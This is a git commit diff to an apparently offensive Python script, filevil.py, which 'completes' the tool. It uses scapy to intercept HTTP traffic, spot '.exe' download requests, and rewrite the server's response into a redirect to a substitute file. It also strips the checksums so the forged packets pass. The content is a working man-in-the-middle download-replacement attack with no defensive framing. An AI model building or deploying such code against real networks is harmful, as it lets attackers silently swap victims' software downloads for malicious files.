81dd8d9f77010fa13d3626298f85e621932d76b4
p37 <gh0stsync.rt@gmail.com>
2018-07-25 09:37:22 -0700

    fixed bug and completed tool.

--- filevil.py
+++ filevil.py
@@ -12,15 +12,13 @@ def process_packet(packet):
             if ".exe" in scapy_packet[scapy.Raw].load:
                 print "[+] exe Request"
                 ack_list.append(scapy_packet[scapy.TCP].ack)
-                print scapy_packet.show()
         elif scapy_packet[scapy.TCP].sport == 80:
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print "[+] Replacing file"
-                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://127.0.0.1/blah.bin"
+                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://127.0.0.1/blah.bin\n\n"
                 del scapy_packet[scapy.IP].len
                 del scapy_packet[scapy.IP].chksum
-                del scapy_packet[scapy.TCP].len
                 del scapy_packet[scapy.TCP].chksum
                 packet.set_payload(str(scapy_packet))
 
